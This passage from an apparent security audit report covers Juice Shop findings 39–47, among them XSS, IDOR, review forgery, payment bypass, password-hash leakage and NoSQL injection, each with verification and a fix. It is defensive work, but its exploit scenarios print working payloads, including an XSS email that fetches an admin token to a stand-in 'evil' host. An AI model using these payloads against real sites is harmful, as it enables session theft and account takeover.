#### Exploit scenario
Attacker registers with email `"><img src=x onerror=fetch('//evil/'+localStorage.token)>`. When an admin opens the Administration page, the email is rendered via [innerHTML] and the payload executes in the admin session.

#### Preconditions
- Attacker can register/control a user email (registration is open)
- Administrator views the user table

```
user.email = this.sanitizer.bypassSecurityTrustHtml(`<span class="${...}">${user.email}</span>`)
```

#### How to fix
Avoid bypassSecurityTrustHtml on user.email; apply the confirmation/error CSS class via [ngClass] and render the email with {{ user.email }} text interpolation at administration.component.ts:57.

**Exploitability:** Stored XSS via user email rendered unescaped in admin DOM — strong pivot to admin session. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — open-registration email is stored unsanitized (challenge-enabled prod path) and rendered into admin DOM via bypassSecurityTrustHtml + [innerHTML]; genuine stored XSS in admin session.

**Analysis**

**A. The sink is real.** `administration.component.ts:57` does exactly what the scanner claims:
```ts
user.email = this.sanitizer.bypassSecurityTrustHtml(`<span class="...">${user.email}</span>`)
```
and the template binds it unescaped at both `:23` (visible table) and `:102` (hidden table) via `[innerHTML]="user.email"`. `bypassSecurityTrustHtml` defeats Angular's built-in DOM sanitizer.

**B. External entry point reached.** `user.service.ts` hits `GET /api/Users`. The email originates from open user registration (`POST /api/Users`, finale auto-CRUD — unauth-reachable per architecture scan). So an unauthenticated attacker controls `user.email`, which is persisted server-side and later rendered in the admin DOM. Confirmed stored/persisted XSS data flow.

**C. Probing defenses.** The model setter (`models/user.ts:56-68`) is the only upstream control:
```ts
set (email) {
  if (utils.isChallengeEnabled(persistedXssUserChallenge)) {
    challengeUtils.solveIf(...)        // NO sanitization
  } else {
    email = security.sanitizeSecure(email)  // sanitized only when challenge OFF
  }
}
```
The `sanitizeSecure` allow-list (`sanitize-html`) only runs when the challenge is **disabled**. Juice Shop ships with challenges **enabled by default** (production state), so the raw markup is stored verbatim. The defense does not cover the live path — this is the intentional "Persisted XSS" challenge.

**D. No other gate.** No length/type constraint blocks markup; the `afterValidate` hook only rejects one specific accountant address. The sink is genuine client-side HTML injection (correct layer — XSS belongs to the rendering component), executing in the admin's authenticated session and able to exfiltrate `localStorage.token`.

This is a deliberately planted, fully reachable vulnerability with real impact (admin session token theft → privilege escalation). Not out of scope: it's a client-side XSS raised against client code (correct layer), attacker-controlled cross-team input, with no effective production defense.

### 40. [MEDIUM] Reflected XSS in order tracking via bypassSecurityTrustHtml
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/track-result/track-result.component.ts:42-45`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)

#### Description
The component reads the unvalidated `id` query parameter (`this.route.snapshot.queryParams.id`) and passes it to `trackOrderService.find`. The returned `results.data[0].orderId` is interpolated into an HTML string and explicitly marked trusted via `this.sanitizer.bypassSecurityTrustHtml(`<code>${results.data[0].orderId}</code>`)`. That value is bound in the template at track-result.component.html:5 with `<span [innerHtml]="results.orderNo">`, so Angular's auto-escaping is fully bypassed. Because the backend trackOrder search echoes the supplied orderId into its response, attacker-controlled markup in the id parameter is rendered as live DOM.

#### Impact
An attacker who can influence the orderId returned by the track-order endpoint gets arbitrary HTML/JS executed in the victim's browser session, enabling session-token theft and account takeover of any user who opens the crafted tracking URL.

#### Exploit scenario
Attacker crafts a link such as `/#/track-result?id=<img src=x onerror=alert(document.cookie)>` (or an order whose orderId contains script-equivalent markup) and sends it to a victim. When the victim opens it, trackOrder returns the matching record, the orderId is wrapped in `<code>` and trusted via bypassSecurityTrustHtml, and the injected handler executes in the victim's authenticated context, exfiltrating their token cookie.

#### Preconditions
- Victim opens an attacker-supplied track-result URL
- trackOrder endpoint reflects the attacker-controlled orderId value into its response

```
this.orderId = this.route.snapshot.queryParams.id
this.trackOrderService.find(this.orderId).subscribe((results) => {
  this.results.orderNo = this.sanitizer.bypassSecurityTrustHtml(`<code>${results.data[0].orderId}</code>`)
```

#### How to fix
Never pass user-derived data through bypassSecurityTrustHtml. At track-result.component.ts:45 bind the plain orderId with text interpolation (`{{ results.orderNo }}`) or escape it before constructing the HTML; remove the DomSanitizer.bypassSecurityTrustHtml call entirely.

**Exploitability:** Reflected XSS in order tracking via trusted-HTML; needs crafted link/interaction. CVSS 6.1 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Unauthenticated query-param value is reflected by the server unsanitized (challenge-enabled branch only truncates) and rendered via bypassSecurityTrustHtml→[innerHtml], yielding live reflected XSS in the victim's authenticated context.

**Analysis**

**A. The sink (track-result.component.ts:42-45):** Confirmed verbatim. `id` is read from `queryParams.id`, passed to the service, and `results.data[0].orderId` is wrapped in `<code>…</code>`, passed through `bypassSecurityTrustHtml`, and bound at `track-result.component.html:5` via `[innerHtml]="results.orderNo"`. Angular auto-escaping is fully bypassed.

**B. Call chain to external entry:** 
- Service (`track-order.service.ts:17-20`) does `GET /rest/track-order/{encodeURIComponent(id)}`. `encodeURIComponent` only URL-encodes for transport; the server decodes it back.
- Backend `trackOrder.ts:12`: with the reflected-XSS challenge enabled, `id = utils.trunc(req.params.id, 60)` — **no character sanitization, only a 60-char truncation**.
- Line 18-19: when no order matches, the server echoes the raw input straight back: `result.data[0] = { orderId: id }`.
- The route `trackOrder` is **UNAUTH-REACHABLE** (confirmed in architecture context). No auth gate.

So attacker input flows: URL query param → server (reflected unmodified, ≤60 chars) → `orderId` → trusted-HTML → DOM. End-to-end, unauthenticated, victim-triggered.

**C. Attempted to kill it:**
- Backend regex `replace(/[^\w-]+/g, '')` *would* strip `<`, `>`, `"`, neutralizing HTML — **but it only applies when `isChallengeEnabled(reflectedXssChallenge)` is FALSE**. The vulnerable `trunc` branch is the enabled-challenge path, which is the default operating mode of Juice Shop. The "defence" is gated off precisely when the vuln is live.
- 60-char limit is enough for a working payload (`<img src=x onerror=...>` or the canonical `<iframe src="javascript:alert(\`xss\`)">`).
- `bypassSecurityTrustHtml` defeats Angular's own sanitizer. `<img onerror>` inserted via `innerHTML` fires on load failure; iframe `javascript:` is the documented solution path.

**D. No remaining defence** covers the enabled-challenge route into the sink.

This is a genuine, reachable, unauthenticated reflected XSS. The scanner correctly identified sink, class, and file. (Scope note: it being an intentional Juice Shop challenge does not move it to FALSE_POSITIVE — the exploitable path is real and enabled by default.)

### 41. [MEDIUM] Stored XSS in admin feedback table via bypassSecurityTrustHtml
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/administration/administration.component.ts:70-86`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.88 (1 run agreed)

#### Description
findAllFeedbacks() iterates feedbacks returned by feedbackService.find() and sets feedback.comment = this.sanitizer.bypassSecurityTrustHtml(feedback.comment), disabling sanitization on the user-controlled comment. The template renders it with <p [innerHTML]="feedback.comment"> at administration.component.html:57, injecting attacker markup directly into the admin DOM.

#### Impact
A user-submitted feedback comment is rendered as raw HTML in the administration panel, so an attacker can run arbitrary script in an administrator's browser, leading to admin session/token theft and full administrative compromise.

#### Exploit scenario
An attacker posts feedback containing `<img src=x onerror=alert(document.cookie)>`. When an administrator opens the Administration page, the comment is rendered via [innerHTML] and the script runs in the admin's authenticated session, allowing theft of the admin JWT.

#### Preconditions
- Attacker can submit feedback
- An administrator opens the administration panel

```
for (const feedback of this.feedbackDataSource) {
  feedback.comment = this.sanitizer.bypassSecurityTrustHtml(feedback.comment)
}
```

#### How to fix
Render feedback.comment via text interpolation {{ feedback.comment }} or sanitize with DomSanitizer.sanitize(SecurityContext.HTML, ...) instead of bypassSecurityTrustHtml at administration.component.ts:75.

**Exploitability:** Stored XSS executing in the admin feedback table — primary admin-takeover XSS sink. CVSS 6.1 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — stored XSS reaches admin DOM via bypassSecurityTrustHtml; server-side sanitize-html@1.4.2 single-pass is bypassable (iframe javascript:), scanner's exact PoC was wrong but a working one exists.

**Analysis**

**A. The sink (administration.component.ts:70-86)** — Confirmed. `findAllFeedbacks()` loops over feedbacks and assigns `feedback.comment = this.sanitizer.bypassSecurityTrustHtml(feedback.comment)`. The template (administration.component.html:57) renders it with `<p [innerHTML]="feedback.comment">`. So Angular's built-in sanitizer is explicitly bypassed at render time — the scanner read the sink correctly.

**B. Data backward to entry point** — `feedback.comment` originates from the `Feedbacks` table, populated via the feedback POST endpoint (finale auto-CRUD `/api/Feedbacks`, anonymous feedback allowed — `UserId` is nullable). External, low/no-privilege entry point reached.

**C. Searching for the defence** — The comment is NOT stored raw. `models/feedback.ts` has a setter that sanitizes on write:
- If `persistedXssFeedbackChallenge` enabled → `security.sanitizeHtml()` (single pass)
- Else → `security.sanitizeSecure()` (recursive sanitize until stable — safe)

So the scanner's claimed PoC `<img src=x onerror=alert()>` would be **stripped** — that specific exploit is wrong.

**D. Probing the defence** — `sanitizeHtml` is backed by `sanitize-html@1.4.2` (package.json:176), a deliberately pinned vulnerable version doing only a single sanitization pass. The model's own solve-check confirms the bypass survives: it tests `contains(sanitizedComment, '<iframe src="javascript:alert(\`xss\`)">')` — i.e. the iframe `javascript:` payload passes through the sanitizer intact. Combined with `bypassSecurityTrustHtml` + `[innerHTML]` in the admin view, that markup renders live in the administrator's authenticated session. This is the intentional **Persisted XSS** challenge.

**Conclusion** — The scanner mis-described the mechanism (the comment IS server-sanitized, and its `<img onerror>` PoC fails), but the underlying class is real: a single-pass weak sanitizer + `bypassSecurityTrustHtml` yields a working stored XSS via the `<iframe src="javascript:...">` bypass, firing in the admin DOM. External entry point reached, defence does not fully close the path, impact is real. The library-version angle (category D) doesn't excuse it — this is an app-level design sink (bypassSecurityTrust on a non-recursively-sanitized field), not merely a CVE in a dep.

Scope is Changed (anonymous attacker → admin session); impact is JWT/session theft → C:L/I:L.

### 42. [MEDIUM] Coupon applied to any basket via unverified basket id
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/coupon.ts:10-21`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
The route handler reads `id` directly from `params.id` (path variable) at line 10. It loads the basket with `BasketModel.findByPk(id)` at line 15 and, on success, calls `basket.update({ coupon: ... })` at line 21. At no point is the loaded basket's owner compared against the authenticated session user (e.g. via the JWT/session basket id stored at login). Therefore the object reference (basket id) is fully attacker-controlled and never authorized for THAT specific object — a textbook IDOR/BOLA.

#### Impact
Any authenticated user can apply a coupon to an arbitrary basket by supplying another user's basket id in the URL. The handler loads the basket purely by the request-supplied id and updates its coupon field without confirming the basket belongs to the caller, allowing horizontal manipulation of other shoppers' baskets.

#### Exploit scenario
User A logs in and observes basket ids are sequential integers. User A sends `PUT /rest/basket/<victim_basket_id>/coupon/<validCoupon>`; the handler loads the victim's basket by id, applies the coupon, and persists it via `basket.update`. The victim's basket state is now altered by an unauthorized user, and basket ids can be enumerated to affect every basket.

#### Preconditions
- Attacker has any authenticated session (low-privilege user account)
- Attacker knows or guesses another basket's id (sequential/enumerable)

```
const id = params.id
...
const basket = await BasketModel.findByPk(id)
if (!basket) { ... }
await basket.update({ coupon: coupon?.toString() })
```

#### How to fix
Authorization must verify the loaded basket belongs to the caller before mutation. After `BasketModel.findByPk(id)`, compare `basket.UserId` (or the basket id stored in the authenticated session/JWT) against the requesting user's identity and reject mismatches; do not derive the target solely from `params.id`.

**Exploitability:** Coupon applied to arbitrary basket id (IDOR); low integrity impact. CVSS 4.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — `/rest/basket/:id/coupon/:coupon` gates only on JWT presence (`isAuthorized` = expressJwt) with no basket-ownership check, so any authenticated user can apply coupons to an enumerable victim basket id.

The `isAuthorized()` middleware mounted at line 365 is only `expressJwt({ secret: [REDACTED-SECRET] })` — it verifies that a valid JWT is present (authentication), but performs **no ownership check** comparing the `:id` in the path against the authenticated user's own basket id. Neither the middleware nor `coupon.ts` ever ties the loaded basket to `req.user`. The route is reached by any authenticated customer, the basket id is fully attacker-controlled and enumerable (sequential integers), and `basket.update({ coupon })` mutates the targeted basket.

This is a genuine BOLA/IDOR. The chain:
- External entry: `PUT /rest/basket/:id/coupon/:coupon` (network, requires only a valid low-priv JWT).
- Defense check (C): only authentication, no per-object authorization. No allow-list, no `UserId` filter, no `appendUserId`-style binding on this route.
- Impact: an attacker can write a (valid) coupon to a victim's basket. The coupon must pass `discountFromCoupon`, so only valid coupons persist — impact is limited to altering another user's basket integrity (a discount they didn't request). No data disclosure, no code execution, no availability loss.

This corresponds to a deliberately planted Juice Shop challenge, but it is exploitable as described. Impact is real but limited to integrity of another user's object (Integrity: Low; no confidentiality/availability impact).

### 43. [MEDIUM] Review author taken from request body, allows identity spoofing
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/createProductReviews.ts:20-26`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
The handler reads the review author directly from req.body.author (line 23) and stores it in MongoDB without verifying it matches the authenticated user (security.authenticatedUsers.from(req), line 13). The only use of the real identity is the challenge-detection comparison on line 16, which has no enforcement effect — it merely flags the challenge as solved. There is no check that req.body.author === user.data.email, so the author value is fully attacker-controlled.

#### Impact
Any authenticated user can publish a product review attributed to an arbitrary other user's email address. The persisted review record carries an attacker-chosen author, letting one user forge feedback in another customer's name, damaging integrity and trust of the review data.

#### Exploit scenario
An authenticated attacker sends PUT /rest/products/1/reviews with body {"message":"...","author":"victim@juice-sh.op"}. The review is inserted with author set to the victim's email. The forged review is then served to all users as if written by the victim.

#### Preconditions
- Attacker holds any valid user session

```
await reviewsCollection.insert({
  product: req.params.id,
  message: req.body.message,
  author: req.body.author,
  likesCount: 0,
  likedBy: []
})
```

#### How to fix
Server must derive the author from the authenticated session, not the request body. At line 23 replace author: req.body.author with author: user?.data?.email and reject the request if no authenticated user is present.

**Exploitability:** Review author taken from body, identity spoof; low integrity. CVSS 5.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — author is attacker-controlled from req.body, no identity check, route ungated, forged reviews served to all users

Confirmed. The route `app.put('/rest/products/:id/reviews', createProductReviews())` at server.ts:588 has **no** `isAuthorized()` guard — unlike the PATCH/POST review routes directly below it — and there is no global auth middleware covering this path. The handler inserts `author: req.body.author` verbatim with no comparison against the authenticated identity; the only use of `user.data.email` (line 16) is the challenge-detection predicate, which has no enforcement effect.

This is the intentional "Forged Review" challenge. The author field is fully client-controlled, the forged review is persisted to MongoDB and served to all users via `showProductReviews()`. Real data-integrity / identity-spoofing impact reachable over the network. The finding accurately reads the sink, class, and file.

(Note: the finding's precondition "valid user session" is actually stricter than reality — the route isn't even auth-gated — but that only strengthens exploitability.)

### 44. [MEDIUM] Stored XSS via weakly sanitized feedback comment
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `models/feedback.ts:38-52`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
Feedback comments enter via the auto-generated CRUD endpoint (server.ts finale.resource → POST /api/Feedbacks). The Sequelize attribute setter routes the attacker-controlled comment string through security.sanitizeHtml() when the persistedXssFeedbackChallenge is enabled. That sanitizer is the deliberately under-configured allow-list used by Juice Shop and does not neutralize all script-bearing markup, so the partially-cleaned string is written verbatim via setDataValue('comment', sanitizedComment) and later rendered in the Angular feedback view, executing in the victim's browser.

#### Impact
An attacker can persist an HTML/JavaScript payload in a feedback comment that executes in the browser of any user (including admins) who views the feedback list, enabling session theft or actions on behalf of victims.

#### Exploit scenario
An attacker POSTs to /api/Feedbacks with a comment containing markup such as `<iframe src="javascript:alert(\`xss\`)">` (or another payload that survives sanitizeHtml). The value is stored, then served to every user loading the feedback page, where the script runs in their authenticated session context.

#### Preconditions
- Feedback creation endpoint reachable (anonymous or low-privilege)
- persistedXssFeedbackChallenge enabled, selecting the weak sanitizeHtml path

```
set (comment: string) {
  let sanitizedComment: string
  if (utils.isChallengeEnabled(challenges.persistedXssFeedbackChallenge)) {
    sanitizedComment = security.sanitizeHtml(comment)
    ...
  } else {
    sanitizedComment = security.sanitizeSecure(comment)
  }
  this.setDataValue('comment', sanitizedComment)
}
```

#### How to fix
Comments must be HTML-escaped or run through a strict allow-list (no raw HTML) before storage AND output-encoded at render time. In this setter (lines 38-52) replace sanitizeHtml with a context-correct encoder and remove the branch that selects the weak sanitizer.

**Exploitability:** Stored XSS through under-configured feedback sanitizer; unauth-submittable, renders to viewers/admins. CVSS 6.1 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Anon-reachable POST /api/Feedbacks → weak sanitize-html 1.4.2 lets iframe payload survive → stored and rendered via bypassSecurityTrustHtml+innerHTML on About page, executing in victims' browsers.

All links in the chain are confirmed:

1. **Sink (models/feedback.ts:38-52)** — matches the scanner snippet exactly. When `persistedXssFeedbackChallenge` is enabled, comment goes through `security.sanitizeHtml()` only.
2. **Sanitizer** — `sanitizeHtml` = `sanitize-html` **v1.4.2** (confirmed installed). This is the deliberately weak, outdated version. The `solveIf` check confirms the iframe payload *survives* sanitization (`contains(sanitizedComment, '<iframe src="javascript:alert(\`xss\`)">')` would never solve otherwise).
3. **Entry point (server.ts:368-372)** — `POST /api/Feedbacks` via finale CRUD. Gated only by a CAPTCHA verifier and forged/captcha-bypass challenge hooks — **no auth requirement**. Externally reachable.
4. **Render sink (about.component.ts:113-123)** — the comment is wrapped in HTML and passed through `this.sanitizer.bypassSecurityTrustHtml()`, then bound via `[innerHTML]="item?.args"` (about.component.html:48). Angular's built-in sanitizer is explicitly disabled, so the partially-cleaned markup executes in every visitor's browser on the About page.

Defences probed (workflow C/D): the only control is the server-side `sanitizeHtml`, and it is intentionally under-configured and outdated (v1.4.2) — the iframe `javascript:` payload passes through. The frontend actively removes Angular's secondary defence via `bypassSecurityTrustHtml`. No auth gate closes the path; CAPTCHA is an anti-automation speed bump, not an input filter.

This is a genuine, working stored XSS (the intended persistedXssFeedbackChallenge). Intentional-by-design for Juice Shop, but it is a real external-attacker-reachable data-impacting vulnerability, so it is a true positive per the decision rule. Impact is classic stored XSS: victim must load the About page (UI:R), runs in their browser context (S:C), limited C/I.

### 45. [MEDIUM] Payment validation skipped when paymentMode is neither wallet nor card
**Class:** CWE-840: Business Logic Errors
**CWE:** CWE-840: Business Logic Errors - https://cwe.mitre.org/data/definitions/840.html
**File:** `routes/deluxe.ts:21-40`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.75 (1 run agreed)

#### Description
Payment verification is gated entirely on req.body.paymentMode equalling 'wallet' (lines 21-29) or 'card' (lines 31-37). Both blocks are skipped for any other value, after which the code unconditionally upgrades the account and issues a deluxe token (line 40). The challenge predicate at line 42 explicitly rewards paymentMode !== 'wallet' && !== 'card', confirming the bypass path. There is no else/allow-list enforcing that a valid payment occurred.

#### Impact
A caller can obtain a paid deluxe membership for free by sending a paymentMode value outside the {wallet, card} set (or omitting it). No funds are checked or charged, yet the role upgrade and deluxe token are still granted.

#### Exploit scenario
Attacker POSTs {"UserId": <own id>, "paymentMode": "free"} (or with no paymentMode). The wallet and card branches are skipped, user.update sets role to deluxe, and the response returns a deluxe token — the attacker gains a 49-cost membership without paying.

#### Preconditions
- Authenticated customer session

```
if (req.body.paymentMode === 'wallet') { ... }
if (req.body.paymentMode === 'card') { ... }
const updatedUser = await user.update({ role: security.roles.deluxe, ... })
```

#### How to fix
Replace the two independent if-checks with an allow-list that rejects any paymentMode not in {'wallet','card'} before reaching the role upgrade at line 40, ensuring a successful charge is a precondition of the upgrade.

**Exploitability:** Deluxe upgrade with no payment when paymentMode is an unknown value; financial bypass for own account. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — missing else/allow-list lets an authenticated customer self-upgrade to paid deluxe membership with paymentMode≠wallet/card; verified reachable via /rest/deluxe-membership with no upstream defense.

Confirmed. The finding is accurate against the actual source:

- **Route & entry point**: `app.post('/rest/deluxe-membership', security.appendUserId(), upgradeToDeluxe())` — a network-reachable endpoint. `appendUserId()` requires a valid authenticated session (throws 401 otherwise) and sets `req.body.UserId` to the caller's own id from the token map.
- **The flaw (lines 21–37)**: payment verification only runs inside two independent `if` blocks for `paymentMode === 'wallet'` and `=== 'card'`. There is no `else`/allow-list. Any other value (e.g. `'free'`, or omitted) skips both.
- **Unconditional upgrade (line 40)**: `user.update({ role: deluxe, deluxeToken: ... })` runs regardless, returning a deluxe token.
- **Confirmation (line 42)**: the planted `freeDeluxeChallenge` predicate explicitly rewards `paymentMode !== 'wallet' && !== 'card'` — the bypass is intentional, but real and exploitable.

I searched for a defense: there is no validation of `paymentMode` upstream, the user must be role `customer` (line 16) but `appendUserId` pins `UserId` to the attacker's own account, so a logged-in customer simply upgrades themselves to a paid (49-cost) deluxe membership for free. No control closes the path.

Impact is a business-logic / authorization bypass: privilege escalation to a paid tier (integrity of authorization state) plus access to deluxe-restricted content (limited confidentiality). Same component, low-privilege authenticated attacker, no user interaction.

### 46. [MEDIUM] Arbitrary user field selection leaks password hash and secrets
**Class:** CWE-213
**CWE:** CWE-213 - https://cwe.mitre.org/data/definitions/213.html
**File:** `routes/currentUser.ts:17-39`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The endpoint reads req.query.fields (untrusted, line 17) and splits it into an attacker-controlled list (line 18). The loop at lines 24-26 copies user.data[field] for ANY field name into the response with no allow-list. The else branch (lines 31-36) shows the intended safe projection limited to id, email, lastLoginIp, profileImage — but the fields branch bypasses that projection entirely, letting the caller pull password (hash), totpSecret, role, or any other model column. The challenge solveIf on line 47 explicitly checks response.user.password, confirming the password hash is reachable through this path.

#### Impact
Any authenticated user can append ?fields=password to /rest/user/whoami and receive their stored password hash, TOTP secret, and other sensitive columns that the endpoint was designed to withhold. This exposes credential material that should never leave the database, enabling offline cracking or 2FA bypass.

#### Exploit scenario
An authenticated user sends GET /rest/user/whoami?fields=password,totpSecret with their valid token cookie. The loop copies user.data.password and user.data.totpSecret into baseUser. The JSON response returns the bcrypt password hash and TOTP secret, which the attacker uses for offline brute force and 2FA bypass.

#### Preconditions
- Attacker has a valid session token (any registered low-privilege user)

```
const fieldsParam = req.query?.fields as string | undefined
const requestedFields = fieldsParam ? fieldsParam.split(',').map(f => f.trim()) : []
...
for (const field of requestedFields) {
  if (user?.data[field as keyof typeof user.data] !== undefined) {
    baseUser[field] = user?.data[field as keyof typeof user.data]
  }
}
```

#### How to fix
The endpoint must never expose fields outside the intended safe set. Replace the unrestricted loop at lines 24-28 with an allow-list check (e.g. const allowed = ['id','email','lastLoginIp','profileImage']; if (allowed.includes(field)) baseUser[field] = ...), or remove the fields-based projection entirely and always use the fixed object from lines 31-36.

**Exploitability:** Arbitrary field projection leaks own password hash/totpSecret; needs session, scoped to self unless chained with JSONP. CVSS 4.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — `fields` param bypasses the safe projection and copies any column (password hash, totpSecret) from the full DB row into the whoami response; reachable by any authenticated user. Leak is limited to the caller's own record.

**Investigation Summary**

**A. The sink (currentUser.ts:17–39):** Verified verbatim. When `?fields=` is supplied, lines 24–28 copy `user.data[field]` for *any* field name with no allow-list, bypassing the safe projection in the else branch (id/email/lastLoginIp/profileImage only).

**B. Call chain to entry point:** `server.ts:553` registers `app.get('/rest/user/whoami', security.updateAuthenticatedUsers(), retrieveLoggedInUser())` — a live network route. Reachable by any user with a valid `token` cookie (the `security.verify` gate on line 14). External entry point confirmed.

**C. Data content / defences:**
- `user = security.authenticatedUsers.get(req.cookies.token)` — the in-memory record.
- That record is stored at login (`login.ts:22`) from `utils.queryResultToJson(authenticatedUser)`, which (`utils.ts:23`) wraps the **full** `SELECT * FROM Users` row with **no field stripping**.
- The User model (`models/user.ts:24,29`) declares `password` and `totpSecret`, so `user.data.password` (the hash) and `user.data.totpSecret` are both present in the copied object.
- No allow-list, no encoding, no projection on the `fields` branch. The intended projection is fully bypassed.
- The challenge `solveIf(challenges.passwordHashLeakChallenge, () => response?.user?.password)` (line 47) confirms `password` is reachable — this is an intentional planted Juice Shop vuln.

**D. Scoping nuance:** The `user` object is keyed by the **caller's own token**, so a caller retrieves only their *own* password hash and totpSecret — not other users'. This is still a genuine info-leak: sensitive credential material that the API design explicitly tries to hide is returned in the response. Impact is real but self-scoped, which caps confidentiality impact rather than eliminating it. No cross-user boundary is crossed.

The finding is accurate (correct file, line, sink, and class). It reaches an authenticated network entry point with no upstream control closing the path. The scanner overstates impact slightly (it's the caller's own data, not arbitrary users'), but the exposure of password hash / TOTP secret via the API is real and intentional.

### 47. [MEDIUM] NoSQL injection via unvalidated review id in body
**Class:** CWE-943
**CWE:** CWE-943 - https://cwe.mitre.org/data/definitions/943.html
**File:** `routes/likeProductReviews.ts:15-22`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
req.body.id (line 15) is passed unmodified into db.reviewsCollection.findOne({ _id: id }) (line 22) and again into the update calls (lines 32-35, 46-49). Because Express JSON parsing allows nested objects, a client can send id as an object such as {"$gt":""} or {"$ne":null}. Mongo then treats it as a query operator, matching documents the caller never named. No type check, cast to string, or schema validation sits between the source and the query sink.

#### Impact
An authenticated user can supply a MongoDB query object instead of a scalar id, causing the lookup to match arbitrary review documents. This lets the attacker target/modify reviews by query operators rather than by their true id, corrupting like data and bypassing the per-document ownership intent.

#### Exploit scenario
An authenticated user POSTs {"id": {"$gt": ""}} to the like endpoint. findOne returns the first review in the collection regardless of its real id, and the subsequent $inc/$set updates mutate that document's likesCount and likedBy. Repeating with operators lets the attacker manipulate review like counts they do not own.

#### Preconditions
- Attacker holds a valid authenticated session (any registered user)
- Request body is JSON so nested objects are accepted

```
const id = req.body.id
...
const review = await db.reviewsCollection.findOne({ _id: id })
```

#### How to fix
Coerce/validate req.body.id to a primitive string before use (e.g. reject non-string id at line 15) and query with the sanitized value at line 22; never pass a raw client object into a Mongo selector.

**Exploitability:** NoSQL operator injection via body id on like endpoint; matches unintended docs. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — req.body.id reaches MarsDB findOne/update as a query selector; MarsDB's DocumentMatcher treats object values as Mongo operators, so an authenticated user can inject {$gt:""}/{$ne:null} to match and mutate reviews they don't own; no validation or cast intervenes.

I have confirmed the full chain.

**A. Sink:** `routes/likeProductReviews.ts:15,22` — `const id = req.body.id` flows unmodified into `db.reviewsCollection.findOne({ _id: id })` and into the `update({_id:id}, ...)` calls (lines 32-35, 46-49). No type cast, no string coercion, no schema check.

**B. Entry point:** `server.ts:590` — `app.post('/rest/products/reviews', security.isAuthorized(), likeProductReviews())`. Network-reachable REST route. Juice Shop uses global `bodyParser.json`, so nested objects in the body are accepted. External, authenticated entry point reached.

**C. Defences:**
- `security.isAuthorized()` = expressJwt → requires a valid JWT, plus handler checks `authenticatedUsers.from(req)`. This only gates *authentication* (any registered user), not the injection.
- No input validation/allow-list/cast sits between source and sink.

